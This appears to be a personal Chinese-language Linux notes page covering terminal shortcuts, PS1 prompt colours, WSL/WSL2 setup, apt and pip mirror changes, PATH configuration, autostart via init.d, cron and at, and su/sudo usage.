数据库肯定是支持网络访问的了,只要你配置好你的宿主机的mysql允许网络访问,并且将你的上网方式设置为桥接,然后在虚拟机的java代码里指定相应的主机就可以了。

【docker内部应用访问宿主mysql】
操作系统为ubuntu16.04.
如果没有安装ifconfig,采用下面的命令安装。然后执行ifconfig,查看容器自己的网段。如果你的容器的ip是172.17.0.2,那么你的宿主机ip一定是172.17.0.1。
apt-get update
apt install net-tools # ifconfig
apt install iputils-ping # ping

【 virtualbox设置共享文件夹 】
设置 -> 共享文件夹 -> 固定分配 -> 共享文件夹路径E:\wamp64\www共享文件夹名称www -> 自动挂载+固定分配
设备 -> 安装增强功能
$ sudo mount -t vboxsf www /mnt

Ctrl+Alt+T打开终端

</pre>
</div>

<div id="linux">
<h2>linux命令</h2><pre>
ubuntu系统日志
启动日志:sudo service rsyslog start
配置文件:/etc/rsyslog.d/50-default.conf
日志文件:/var/log/syslog

</pre>

<h3>终端快捷键</h3><pre>
Tab 自动补全
Ctrl+a 光标移动到开始位置
Ctrl+e 光标移动到最末尾
Ctrl+k 删除此处至末尾的所有内容
Ctrl+u 删除此处至开始的所有内容
Ctrl+d 删除当前字符
Ctrl+h 删除当前字符前一个字符
Ctrl+w 删除此处到左边的单词
Ctrl+y 粘贴由Ctrl+u,Ctrl+d,Ctrl+w删除的单词
Ctrl+l 相当于clear,即清屏
Ctrl+r 查找历史命令
Ctrl+b 向回移动光标
Ctrl+f 向前移动光标
Ctrl+t 将光标位置的字符和前一个字符进行位置交换
Ctrl+& 恢复ctrl+h或ctrl+d或ctrl+w删除的内容
Ctrl+S 暂停屏幕输出
Ctrl+Q 继续屏幕输出
Ctrl+Left 光标移动到上一个单词的词首
Ctrl+Right 光标移动到下一个单词的词尾
Ctrl+p 向上显示缓存命令
Ctrl+n 向下显示缓存命令
Ctrl+d 关闭终端
Ctrl+xx 在EOL和当前光标位置移动
Ctrl+x@ 显示可能hostname补全
Ctrl+c 终止进程/命令
Shift +上或下 终端上下滚动
Shift+PgUp/PgDn 终端上下翻页滚动
Ctrl+Shift+n 新终端
alt+F2 输入gnome-terminal打开终端
Shift+Ctrl+T 打开新的标签页
Shift+Ctrl+W 关闭标签页
Shift+Ctrl+C 复制
Shift+Ctrl+V 粘贴

</pre>

<h4>修改linux终端命令行各字体颜色</h4><pre>
PS(Prompt Sign)命令提示符,PS1是Linux终端用户的一个环境变量,用来定义命令行提示符的参数。在设定PS1环境变量时需要用到预设的一些参数来设定PS1

【 查看当前PS1的设置 】
berlin75@LAPTOP-0KMQM01D:/mnt/c/Users/lenovo$ echo $PS1
\[\e]0;\u@\h: \w\a\]${debian_chroot:+($debian_chroot)}\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$

【 PS1的常用参数 】
\d:代表日期,格式为weekday month date,如"Mon Aug 1"
\H:完整的主机名称
\h:仅取主机名中的第一个名字
\t:显示时间为24小时格式,如HH:MM:SS
\T:显示时间为12小时格式
\A:显示时间为24小时格式,HH:MM
\u:当前用户的账号名称
\v:BASH的版本信息
\w:完整的工作目录名称
\W:利用basename取得工作目录名称,只显示最后一个目录名
\#:下达的第几个命令
\$:提示字符,如果是root用户,提示符为#,普通用户则为$

【 设置PS1 】
当前用户的.bashrc环境配置中,在底部添加PS1并赋值:
vim ~/.bashrc
PS1="\u@\h: \W\$ "
source ~/.bashrc

echo 'PS1="\[\e[01;32m\]\u@\h \[\e[01;33m\]\w\[\e[01;32m\]\$\[\e[00m\] "' >> ~/.bashrc

【 颜色设置参数 】
PS1设置字符颜色的格式为:[\e可替换为[\033,\[\e[0m\]结束颜色设定
\[\e[F;Bm\].....\[\e[0m\]

其中"F"为字体颜色,编号为30-37,"B"为背景颜色,编号为40-47
F   B   颜色   
30  40  黑色
31  41  红色
32  42  绿色
33  43  黄色
34  44  蓝色
35  45  紫红色
36  46  青蓝色
37  47  白色

"B"还可以设置其他格式,例如为1时将显示加亮加粗的文字
0 OFF
1 高亮显示
4 underline
5 闪烁
7 反白显示
8 不可见    

设置命令提示符为绿色
PS1="\[\e[01;32m\]\u@\h: \w\$\[\e[00m\] "
PS1="\[\033[01;32m\]\u@\h: \w\$\[\033[00m\] "
PS1="\[\e[01;32m\]\u@\h \[\e[01;37m\]\w\[\e[01;32m\]\$\[\e[00m\] "
PS1="\[\e[01;32m\]\u@\h \[\e[01;33m\]\w\[\e[01;32m\]\$\[\e[00m\] "

【 Linux终端下输出彩色文字 】
printf("\033[0;37m%s  \033[0m","K_Linux_Man");
printf("\033[0;34;1m%s  \033[0m","K_Linux_Man");
printf("\033[0;32;1m%s  \033[0m","K_Linux_Man");
printf("\033[0;37m%s  \033[0m","K_Linux_Man");

\033是E的asc码,而这种是一个标记对,\033是成对存在的,当然可以把E代替成\033
\033[ 后面的第一个参数是关闭所有文字的效果,第二个参数是字体以及字体背景的颜色,第三个参数是字体的效果:
1表示高亮、4表示下划线、5表示闪烁、7表示背景取反、2J表示清屏
最后一个m代表后面跟着要显示的字符串

</pre>

<h3>虚拟机中ubuntu 18.04设置 ubuntu-18.04-live-server-amd64.iso</h3><pre>
【 设置系统时区 】
UTC是0时区的时间即国际标准,中国处于UTC+8时区(CST)

$ date -R          # 查看时区
$ sudo tzselect    # 修改时区
$ TZ='Asia/Shanghai';export TZ
$ echo TZ='Asia/Shanghai'; export TZ >> ~/.profile  # 永久设置

【 再开一个终端 】
Alt+f2~6

【 分辨率设置 】
1.sudo vi /etc/default/grub

2.在打开的文件中加入
GRUB_GFXMODE=800x600
GRUB_CMDLINE_LINUX_DEFAULT="915.modeset=0 nomodeset"

3.更新,重启
sudo update-grub
reboot

4.分辨率查看命令:fbset
1024*768
800*600

</pre>

<h3><a href="https://docs.microsoft.com/zh-cn/windows/wsl/reference">windows10中的子系统ubuntu文件系统</a></h3><pre>
WSL(Windows Subsystem for Linux),用于Linux的Windows子系统,也被称为Bash for Windows

目前子系统与Windows之间通过以下两种方式进行通讯
1、通过tcp协议进行通讯,用网络、端口都是通的
2、通过/mnt/盘符/目录的方式访问Windows目录

win10子系统ubuntu的系统文件地址: %LOCALAPPDATA%\Packages\{Linux发行版}\LocalState\rootfs
C:\Users\lenovo\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs

文件系统的最顶层是由根目录开始的,系统使用/来表示根目录,根目录下可以是目录或文件,而每一个目录中又可以包含子目录文件,如此反复就可以构成一个庞大的文件系统

bin  boot  dev  etc  home  init  lib  lib64  media  mnt  opt  proc  root  run  sbin  snap  srv  sys  tmp  usr  var

/bin:
bin是Binary的缩写,存放着最经常使用的命令

/boot:
存放启动Linux时使用的一些核心文件,包括一些连接文件以及镜像文件

/dev :
dev是Device(设备)的缩写, 该目录下存放的是Linux的外部设备,在Linux中访问设备的方式和访问文件的方式是相同的

/etc:
存放所有的系统管理所需要的配置文件和子目录

/home:
用户的主目录,在Linux中,每个用户都有一个自己的目录,一般该目录名是以用户的账号命名的

/lib:
存放着系统最基本的动态连接共享库,其作用类似于Windows里的DLL文件,几乎所有的应用程序都需要用到这些共享库

/media:
linux系统会自动识别一些设备,例如U盘、光驱等等,当识别后,linux会把识别的设备挂载到这个目录下

/mnt:
用户临时挂载别的文件系统的,可将光驱挂载在/mnt/上,包含了windows的文件系统

/opt:
给主机额外安装软件所摆放的目录,比如安装一个ORACLE数据库则就可以放到这个目录下,默认是空的

/proc:
一个虚拟的目录,是系统内存的映射,可通过直接访问这个目录来获取系统信息。这个目录的内容不在硬盘上而是在内存里,也可以直接修改里面的某些文件,比如可以通过echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all命令来屏蔽主机的ping命令使别人无法ping机器

/root:
系统管理员目录,也称作超级权限者的用户主目录

/sbin:
s就是Super User,存放系统管理员使用的系统管理程序

/srv:
存放一些服务启动之后需要提取的数据

/sys:
这是linux2.6内核的一个很大的变化。该目录下安装了2.6内核中新出现的一个文件系统sysfs,sysfs文件系统集成了下面3种文件系统的信息:针对进程信息的proc文件系统、针对设备的devfs文件系统及针对伪终端的devpts文件系统。
该文件系统是内核设备树的一个直观反映。
当一个内核对象被创建的时候对应的文件和目录也在内核对象子系统中被创建

/tmp:
用来存放一些临时文件的

/usr:
非常重要的目录,用户的很多应用程序和文件都放在这个目录下,类似于windows下的program files目录
/usr/bin:系统用户使用的应用程序。
/usr/sbin:超级用户使用的比较高级的管理程序和系统守护程序。
/usr/src:内核源代码默认的放置目录

/var:
存放着在不断扩充着的东西,习惯将那些经常被修改的目录放在这个目录下,包括各种日志文件

【 安装wsl 】
控制面板 -> 程序和功能 -> 启用或关闭Windows功能 -> 勾选 适用于Linux的Windows子系统(Beta)
设置 - 更新和安全 - 针对开发人员设置页面 - 开发人员模式下载安装开发人员模式程序包,等待安装完成

安装前需要在启动或关闭Windows功能中勾选适用于Linux的Windows子系统,或直接在管理员权限的PowerShell中执行Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux命令也能达到同样的效果

可以有两种方法安装
1. 第一种是在Microsoft store直接搜索Ubuntu进行安装,直接下载完成直接启动就可以
2. 第二种是在win10命令行输入bash命令显示ubuntu安装链接,用win10自带浏览器即可打开

在应用设置中可以查看wsl分发版的数据大小

Canonical公司发布了特定版本的Ubuntu系统,例如Ubuntu 16.04 LTS、Ubuntu 18.04 LTS等,建议直接下载无版本号的Ubuntu,而不要下载特定版本的Ubuntu,因为无版本号的Ubuntu会在新版本Ubuntu发布之后切换到最新版,所以它始终指向最新的Ubuntu。应用商店里Ubuntu软件的更新并不会升级Ubuntu版本,如果恰好安装的是旧版本,想要升级到新版本,可以在WSL中运行do-release-upgrade命令升级到最新版。
下载完成后启动Ubuntu有多种方式,可以在PowerShell或cmd中输入wsl或bash或ubuntu都可启动,也可以直接在开始菜单中点击Ubuntu图标启动
初次进入Linux子系统需要设置Linux的用户名及密码

可通过多种方式配合适用于Linux的Windows子系统运行Linux
[distro],例如 ubuntu  # 按分发版启动WSL,缺点是会自动将工作目录从当前目录更改为分发版的主目录
wsl.exe 或 bash.exe
wsl [command] 或 bash -c [command]

wsl不仅可以保留当前工作目录,而且还允许结合Windows命令运行单个命令
PS C:\Users\sarah> Get-Date
Sunday, March 11, 2018 7:54:05 PM

PS C:\Users\sarah> wsl
scooley@scooley-elmer:/mnt/c/Users/sarah$ date
Sun Mar 11 19:56:57 DST 2018
scooley@scooley-elmer:/mnt/c/Users/sarah$ exit
logout

PS C:\Users\sarah> wsl date
Sun Mar 11 19:55:47 DST 2018

PS C:\Users\sarah> Get-VM | wsl grep "Ubuntu"

列出分发版
wsl -l、wsl --list  # 列出可用于WSL的已安装且可供使用的Linux分发版
wsl --list --all   # 列出所有分发版,包括当前不可用的分发版。 这些分发版可能正在安装、卸载或处于损坏状态。
wsl --list --running  # 列出当前正在运行的所有分发版。

设置默认分发版
默认WSL分布版是在命令行中运行wsl时运行的分发版。
wsl -s < DistributionName>、wsl --setdefault < DistributionName> # 将默认分发版设置为< DistributionName>
wsl -s Ubuntu  # 将默认分发版设置为Ubuntu,运行wsl npm init时该分发版将在Ubuntu中运行,如果运行wsl它会打开Ubuntu会话

取消注册和重新安装分发版
可通过Microsoft Store安装Linux分发版,但无法通过Store卸载。可通过WSL Config取消注册/卸载分发版,取消注册后还可以重新安装分发版。
取消注册后与该分发版关联的所有数据、设置和软件将永久丢失,从Store重新安装会安装分发版的干净副本。
wsl --unregister < DistributionName>  # 从WSL中取消注册分发版,以便能够重新安装或清理它。
例如:wsl --unregister Ubuntu 将从可用于WSL的分发版中删除Ubuntu。运行wsl --list时不再会列出Ubuntu。
若要重新安装,请在 Microsoft Store 中找到该分发版,然后选择"启动"。

wsl -u < Username>、wsl --user < Username>  # 以指定用户的身份运行WSL,该用户必须存在于WSL分发版中。
wsl -d < DistributionName>、wsl --distribution < DistributionName>  # 运行WSL的指定分发版。可用于将命令发送到特定的分发版,而无需更改默认值

WSL启动配置
wsl.conf位于每个Linux分发版的/etc/wsl.conf中,如果该文件不存在可以自行创建。 WSL会检测该文件是否存在,并读取其内容。 如果该文件缺失或格式不正确WSL将继续如常启动。

# Enable extra metadata options by default
[automount]
enabled = true
root = /windir/
options = "metadata,umask=22,fmask=11"
mountFsTab = false

# Enable DNS – even though these are turned on by default, we’ll specify here just to be explicit.
[network]
generateHosts = true
generateResolvConf = true

wsl与Windows的互操作性
1、Windows预览体验成员内部版本17063+在Linux与Windows之间共享环境变量。
2、从Linux控制台调用Windows二进制文件。
使用wsl.exe < command> 从Windows命令提示符即CMD或PowerShell运行Linux二进制文件,如wsl ls -la /proc/cpuinfo、wsl sudo apt-get update
3、从Windows控制台调用Linux二进制文件。
WSL可以使用[binary name].exe直接从WSL命令行调用Windows二进制文件,例如notepad.exe,$ ipconfig.exe | grep IPv4 | cut -d: -f2
为使Windows可执行文件更易于运行,Windows路径将包含在Fall Creators Update中的Linux $PATH内
Windows 二进制文件必须包含文件扩展名,匹配文件大小写,并且可执行

【 更换软件源(apt源和pip源) 】
系统默认的apt源是国外的,下载软件速度慢,python的pip源也很慢,换成阿里云的源。

查看系统代号
$ lsb_release -c
Codename: bionic

Ubuntu 16.04 TLS: xenial  16.04 xenial
Ubuntu 18.04 TLS: bionic  18.04 bionic

cd /etc/apt/
sudo cp sources.list sources.list.bak && sudo vim sources.list # 备份
sudo vim sources.list  # 删除其中所有内容,替换成阿里云的源
sudo apt update
sudo apt upgrade

Ubuntu 16.04 TLS版本阿里云镜像源:
deb http://mirrors.aliyun.com/ubuntu/ xenial main restricted universe multiverse
deb http://mirrors.aliyun.com/ubuntu/ xenial-security main restricted universe multiverse 
deb http://mirrors.aliyun.com/ubuntu/ xenial-updates main restricted universe multiverse 
deb http://mirrors.aliyun.com/ubuntu/ xenial-backports main restricted universe multiverse 
deb http://mirrors.aliyun.com/ubuntu/ xenial-proposed main restricted universe multiverse 
deb-src http://mirrors.aliyun.com/ubuntu/ xenial main restricted universe multiverse 
deb-src http://mirrors.aliyun.com/ubuntu/ xenial-security main restricted universe multiverse 
deb-src http://mirrors.aliyun.com/ubuntu/ xenial-updates main restricted universe multiverse 
deb-src http://mirrors.aliyun.com/ubuntu/ xenial-backports main restricted universe multiverse 
deb-src http://mirrors.aliyun.com/ubuntu/ xenial-proposed main restricted universe multiverse 
deb http://archive.canonical.com/ubuntu/ xenial partner 
deb http://extras.ubuntu.com/ubuntu/ xenial main

Ubuntu 18.04 TLS版本阿里云镜像源:
# https://opsx.alibaba.com/mirror
deb https://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse
deb https://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse
deb https://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse
deb https://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse
deb https://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse

pip源
创建pip配置文件
$ mkdir ~/.pip && vim ~/.pip/pip.conf
复制保存以下内容
[global]
trusted-host=mirrors.aliyun.com
index-url=http://mirrors.aliyun.com/pypi/simple/

【 卸载 】
管理员身份打开命令提示符输入lxrun /uninstall /full,然后根据提示输入y即可开始卸载
windows设置 - 应用 - 找到Linux子系统,如Ubuntu,然后点击高级选项,可以看到重置,卸载等选项

【 WSL-Ubuntu18.04 LTS重启方法 】
由于Linux环境应用程序如Ubuntu,Debian,OpenSuse或Kali不支持为Linux操作系统提供基本构建块的Systemd,因此无法使用reboot或systemctl命令来管理systemd服务,WSL子系统是基于LxssManager服务运行的,只需要将LxssManager服务重启即可
//以管理员权限运行cmd
>net stop LxssManager //停止
>>net start LxssManager //启动

【 WSL2 】
WSL2是WSL中体系结构的新版本,更改Linux发行版与Windows交互方式,支持适用于Linux的Windows子系统在Windows上运行ELF64 Linux二进制文件。
WSL2的主要目标是提高文件系统性能并增加系统调用的完全兼容性,这一新的体系结构更改了这些Linux二进制文件如何与Windows和计算机的硬件交互,但仍提供与WSL1相同的用户体验。
每个Linux发行版都可以作为WSL1或WSL2发行版运行,并可随时进行切换,随时可以进行升级或降级,还可以同时运行WSL1和WSL2发行版。
WSL2使用全新的体系结构,该体系结构使用实际Linux内核,WSL2是底层体系结构的主要功能,它使用虚拟化技术和Linux内核来实现其新功能
WSL2中的Linux内核内置于最新稳定分支中,基于kernel.org提供的源。此内核已专门针对WSL2进行了优化

WSL2使用最新和最高的虚拟化技术在轻型实用程序虚拟机(VM)内部运行Linux内核。 但是WSL2不会成为传统的VM体验。传统的VM体验启动速度慢,隔离,消耗大量资源,需要你的时间进行管理。 WSL2没有这些属性。它仍将为WSL1带来优异的好处:Windows 和Linux的高级集成、极快的启动时间、小资源占用量,并且最重要的是,不需要VM配置或管理。尽管WSL2使用VM,但会管理并在后台运行,从而使你拥有与WSL1相同的用户体验

文件IO性能提高
文件密集型操作(如git克隆、npm安装、apt更新、apt升级等)都将以更快的速度显著提高,实际的速度提高将取决于正在运行的应用以及与文件系统交互的方式

完全系统调用兼容性
Linux二进制文件使用系统调用来执行许多功能,例如访问文件、请求内存、创建进程等。 尽管WSL1使用WSL团队生成的翻译层,WSL2还包括其自己的Linux内核,并且具有完全系统调用兼容性。 这会引入一个全新的应用程序集,这些应用程序可在WSL内运行,例如Docker等。 此外对Linux内核的任何更新都可以立即准备好添加到计算机,而不是等待WSL团队实施更改,然后再添加它们

wsl2步骤:
1、确保已安装WSL并且运行的是Windows10内部版本18917或更高版本,请加入Windows预览体验计划,并选择 "快速" 环。
Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux
2、启用"虚拟机平台"可选组件,即win10设置->程序与功能->虚拟机平台
Enable-WindowsOptionalFeature -Online -FeatureName VirtualMachinePlatform
3、使用命令行设置要由WSL2支持的发行版,wsl -l查看发行版,可以随时更改回WSL1
wsl --set-version Ubuntu 2
wsl --set-default-version 2  # 使WSL2成为默认体系结构,这会使安装的任何新发行版均初始化为WSL2发行版
4、验证发行版使用的WSL版本
wsl --list --verbose 或 wsl -l -v

【 WSL1和WSL2预览版之间的用户体验差异 】
将Linux应用需要访问的文件放在Linux根文件系统中可以提高文件访问速度
在WSL2预览版的初始版本中需要使用IP地址而不是localhost来访问网络应用程序,需要使用主机的IP地址从Linux访问任何Windows server
WSL2使用虚拟硬件磁盘(VHD)来存储文件,如果达到其最大大小则可能需要将其扩展,WSL2将所有Linux文件都存储在使用ext4文件系统的VHD中,此VHD会自动调整大小以满足你的存储需求,此VHD的初始最大大小为256GB
启动时,WSL2现在将使用少量内存
初始预览版本中跨OS文件访问速度会变慢

从Linux访问Windows应用程序
若要访问Windows网络应用程序(例如通过curl连接到在Windows中运行的Node.js服务器)需要使用主机的IP地址,为此可以执行以下步骤:
1、通过运行命令cat /etc/resolv.conf并复制该字词nameserver后面的ip地址来获取主机的ip地址。
2、使用复制的IP地址连接到任何Windows server。

从Windows访问Linux应用程序
如果生成为18945或更高版本则可以像平时一样使用localhost

【 将wsl2移到c盘以外的驱动器 】
https://github.com/DDoSolitary/LxRunOffline

1、Set permissions to the target folder
mkdir D:\wsl
whoami  # 查看管理员,laptop-0kmqm01d\lenovo
icacls D:\wsl /grant "lenovo:(OI)(CI)(F)"  # 把这个目录给管理员权限

2、Move the distribution
lxrunoffline move -n Ubuntu-18.04 -d d:\wsl\installed\Ubuntu-18.04
lxrunoffline get-dir -n Ubuntu-18.04

3、Run the distribution
lxrunoffline run -n Ubuntu-18.04 -w
wsl  # 同上

</pre>
</div>

<div id="linuxSys">
<h3>linux system</h3><pre>
【 查看和添加环境变量 】
在Linux下使用源码安装软件时通常只能在软件安装目录下使用该软件命令,希望全局使用可以将软件安装路径添加到系统环境变量里。
$PATH:决定shell将到哪些目录中寻找命令或程序,PATH的值是一系列目录,运行一个程序时Linux在这些目录下进行搜寻编译链接。

单独查看PATH环境变量,查看当前的搜索路径
# echo $PATH
/usr/kerberos/sbin:/usr/kerberos/bin:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin:/root/bin

export命令查看PATH值
~$ export
declare -x HOME="/home/berlin75"
declare -x HOSTTYPE="x86_64"
declare -x LANG="en_US.UTF-8"
declare -x LESSCLOSE="/usr/bin/lesspipe %s %s"
declare -x LESSOPEN="| /usr/bin/lesspipe %s"
declare -x LOGNAME="berlin75"
declare -x LS_COLORS="rs=0:di=01;3...........spx=00;36:*.xspf=00;36:"
declare -x NAME="LAPTOP-0KMQM01D"
declare -x OLDPWD="/home/berlin75/testdir"
declare -x PATH="/home/berlin75/bin:/home/berlin75/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/mnt/c/Program Files(x86)/Common Files/Intel/Shared Files/cpp/Bin/Intel64:/mnt/c/Windows/System32:/mnt/c/Windows:/mnt/c/Windows/System32/wbem:/mnt/c/Windows/System32/WindowsPowerShell/v1.0:/mnt/e/wamp64/bin/mysql/mysql5.7.9/bin:/mnt/e/wamp64/bin/php/php5.6.16:/mnt/c/ProgramData/ComposerSetup/bin:/mnt/e/soft/yarn/bin:/mnt/e/soft/node:/mnt/e/soft/mongodb/bin:/mnt/e/soft/redis:/mnt/e/soft/curl/curl-7.59.0-win64-mingw/bin:/mnt/e/soft/git/Git/bin:/mnt/e/wnmp/mysql/bin:/mnt/c/Windows/System32/OpenSSH:/mnt/e/360Downloads/Software/KuGou2012/KuGou.exe:/mnt/c/Users/lenovo/AppData/Local/Microsoft/WindowsApps:/mnt/c/Users/lenovo/AppData/Roaming/npm:/mnt/e/soft/vscode/Microsoft VS Code/bin:/snap/bin"
declare -x PWD="/home/berlin75"
declare -x SHELL="/bin/bash"
declare -x SHLVL="1"
declare -x TERM="xterm-256color"
declare -x USER="berlin75"
declare -x XDG_DATA_DIRS="/usr/local/share:/usr/share:/var/lib/snapd/desktop"

编辑PATH声明的格式为:
PATH=$PATH:< PATH1>:< PATH2>:< PATH3>:------:< PATHN>
export PATH=$PATH:路径1:路径2:路径n;
$PATH为系统变量,表示之前所有设置的路径,如果不加则之前所有的路径都失效,所以必须加上;可加上指定的路径,中间用冒号隔开。这样定制后就可以避免频繁的启动位于shell搜索的路径之外的程序了,最好不要把当前路径"./"放到PATH里,这样可能会受到意想不到的攻击

重新初始化shell环境
环境变量更改后,在用户下次登陆时生效,可以关闭当前的终端窗口重新启动一个就可以了,如果想立刻生效则可执行命令:
$ source ~/.bashrc

添加PATH环境变量(临时),在终端关闭后就会消失
# export PATH=/opt/STM/STLinux-2.3/devkit/sh4/bin:$PATH

永久添加环境变量(影响当前用户)
# vim ~/.bashrc
# export PATH="/opt/STM/STLinux-2.3/devkit/sh4/bin:$PATH"
# 或执行
# echo 'export PATH=/opt/STM/STLinux-2.3/devkit/sh4/bin:$PATH' >> ~/.bashrc
# source ~/.bashrc

永久添加环境变量(影响所有用户)
# vim /etc/profile
# export PATH="/opt/STM/STLinux-2.3/devkit/sh4/bin:$PATH"  # 添加到文档最后,保存,退出
# source /etc/profile  # 不报错则成功

【 Linux自动启动程序 】
1．开机启动时自动运行程序
Linux加载后将初始化硬件和设备驱动,然后运行第一个进程init。init根据配置文件继续引导过程,启动其它进程。通常情况下修改放置在/etc/rc或/etc/rc.d或 /etc/rc?.d目录下的脚本文件可以使init自动启动其它程序。例如编辑/etc/rc.d/rc.local文件(该文件通常是系统最后启动的脚本),在文件最末加上一行"xinit"或"startx",可以在开机启动后直接进入X－Window。

linux随机启动的服务程序都在/etc/init.d文件夹里,里面的文件全是脚本文件
在/etc文件夹里有rc1.d,rc2.d...rc6.d的文件夹,这些都是linux不同的runlevel,一般运行级别是第5级即rc5.d,在这个文件夹下的脚本文件就是运行第5级时要随机启动的服务程序。在每个rc(1-6).d文件夹下的文件其实都是/etc/init.d文件夹下的文件的一个软连接(类似windows快捷方式),即在/etc/init.d文件夹下是全部的服务程序,而每个rc(1-6).d只链接它自己启动需要的相应的服务程序

要启动scim程序,首先要知道scim程序在哪里,用locate命令可找到,scim在/usr/bin/scim,其中usr表示是属于用户的,bin在linux里表示可以执行的程序。这样就可以编写一个脚本程序,把它放到/etc/init.d里,然后在rc5.d里做一个相应的软链接就可以了

#!/bin/bash   # 声明用什么终端运行这个脚本
/usr/bin/scim # 要运行的命令

在rc5.d里每个链接的名字都是以S或K开头的,S开头的表示是系统启动是要随机启动的,K开头的是不随机启动的。这样就可以知道,如果要哪个服务随机启动,就把它名字第一个字母K改成S就可以了,当然把S改成K后,这个服务就不能随机启动了。因此这个链接 还要起名为SXXX,这样系统才能让它随机启动。

2．登录时自动运行程序
用户登录时bash首先自动执行系统管理员建立的全局登录脚本/ect/profile,然后bash在用户起始目录下按顺序查找三个特殊文件中的一个:/.bash_profile、/.bash_login、/.profile,但只执行最先找到的一个。
因此只需根据实际需要在上述文件中加入命令就可以实现用户登录时自动运行某些程序(类似于DOS下的Autoexec.bat)

3．退出登录时自动运行程序
退出登录时bash自动执行个人的退出登录脚本/.bash_logout。例如在/.bash_logout中加入命令"tar －cvzf c.source.tgz ＊.c"则在每次退出登录时自动执行"tar"命令备份＊.c文件。

4．定期自动运行程序
Linux有一个称为crond的守护程序,主要功能是周期性地检查/var/spool/cron目录下的一组命令文件的内容,并在设定的时间执行这些文件中的命令。用户可以通过crontab命令来建立、修改、删除这些命令文件。
例如建立文件crondFile,内容为"00 9 23 Jan ＊ HappyBirthday",运行"crontab cronFile"命令后,每当元月23日上午9:00系统自动执行"HappyBirthday"的程序

5．定时自动运行程序一次
定时执行命令at与crond类似:命令在给定的时间执行,但它只执行一次不自动重复。
at命令的一般格式为:at [ －f file ] time ,在指定的时间执行file文件中所给出的所有命令。
也可直接从键盘输入命令:
$ at 12:00
at>mailto Roger －s ″Have a lunch″ < plan.txt
at>Ctr－D
Job 1 at 2000－11－09 12:00
即2000－11－09 12:00时自动发一标题为"Have a lunch",内容为plan.txt文件内容的邮件给Roger。?9 12:00

</pre>
</div>

<div id="userlogin">
<h3>user login</h3>
<h4>登录和退出登录</h4><pre>
默认登录的是普通用户权限
#:代表当前用户是root用户
$:代表当前用户是普通用户,berlin75@LAPTOP-0KMQM01D:~$

exit 退出登录

su命令在不退出登陆的情况下切换到另一个身份,用于切换当前用户身份到其他用户身份,变更时须输入所要变更的用户帐号与密码
从普通用户切换超级用户权限(super user do):sudo su
从超级用户切换普通用户(switch user):su 用户名,如只输入su则默认是切换至root帐户

sudo(superuser do)是linux下常用的允许普通用户使用超级用户权限执行程序的工具,该命令为管理员提供了一种细颗粒度的访问控制方法,通过它人们既可以作为超级用户又可以作为其它类型的用户来访问系统。这样做的好处是,管理员能够在不告诉用户root密码的前提下,授予他们某些特定类型的超级用户权限

设置分配很简单,只要为root设置一个root密码就行了: $ sudo passwd root,之后会提示要输入root用户的密码,连续输入root密码,再使用:$ su就可以切换成超级管理员用户登陆了

su(选项)(参数)

选项
-c<指令>或--command=<指令>:执行完指定的指令后即恢复原来的身份,如su -c ls root
-f或——fast:适用于csh与tsch,使shell不用去读取启动文件;
-l或——login:改变身份时同时变更工作目录及HOME,SHELL,USER,logname,此外也会变更PATH变量;
-m,-p或--preserve-environment:变更身份时不要变更环境变量;
-s< shell >或--shell=< shell >:指定要执行的shell;
--help:显示帮助;
--version;显示版本信息。

参数
用户:指定要切换身份的目标用户。

su root -f   # 变更帐号为root并传入-f选项给新执行的shell
su -test     # 变更帐号为test并改变工作目录至test的家目录

su、sudo、sudo su、sudo -i的用法和区别
sudo : 暂时切换到超级用户模式以执行超级用户权限,提示输入密码时该密码为当前用户的密码,而不是超级账户的密码,Ubuntu默认时间限制为一次时长15分钟。
su : 切换到某某用户模式,提示输入密码时该密码为切换后账户的密码,用法为"su 账户名称"。如果后面不加账户时系统默认为root账户,密码也为超级账户的密码,没有时间限制。
sudo -i: 为了频繁的执行某些只有超级用户才能执行的权限,而不用每次输入密码,可以使用该命令。提示输入密码时该密码为当前账户的密码。没有时间限制。执行该命令后提示符变为"#"而不是"$"。想退回普通账户时可以执行"exit"或"logout" 。

【 gosu命令 】
如果以root执行的脚本,在执行期间希望改变身份,比如希望以某个已经建立好的用户来运行某个服务进程,不要使用su或sudo,这些都需要比较麻烦的配置,而且在TTY缺失的环境下经常出错。建议使用gosu,可以从其项目网站看到进一步的信息:https://github.com/tianon/gosu

</pre>

<h4>查看当前用户和所属组</h4><pre>
1、w命令查看登录用户行为,登陆系统用户很多时可在W后面加上某个用户名查看该用户执行任务的情况
w displays  information  about the users currently on the machine, and their processes
users 表示当前系统登陆用户总数为6。
LOAD AVERAGE 与后面的数字一起表示系统在过去1,5,10分钟内的负载程度,数值越小,系统负载越轻。
从第二行开始构成一个8个栏目的表格,分别显示各个用户正在做的事情及该用户所占用的系统资源
USER:显示登陆用户帐号名。用户重复登陆,该帐号也会重复出现。
TTY:用户登陆所用的终端。
FROM:显示用户在何处登陆系统。
LOGIN@:是LOGIN AT的意思,表示登陆进入系统的时间。
IDLE:用户空闲时间,从用户上一次任务结束后,开始记时。
JCPU:一终端代号来区分,表示在某段时间内,所有与该终端相关的进程任务所耗费的CPU时间。
PCPU:指WHAT域的任务执行后耗费的CPU时间。
WHAT:表示当前执行的任务

2、who命令查看主机上的用户
第一列是用户名,
第二列是连接的终端,tty表示显示器,pts表示远程连接,tty1-6是文本型控制台,7是x-window(图形)控制台
第三列是登陆时间

3、whoami查看当前登录用户是谁

4、lastlog命令查看主机上的用户

5、last 最近一个月用户登陆情况

6、groups命令可以查看某个用户所属的用户组,groups username
只执行groups命令可以查看系统当前登录用户的用户组

7、查看/etc/group法
/etc/group是用户组配置文件,可以查看此文件通过grep命令查询某个用户所在的用户组
cat /etc/group | grep air

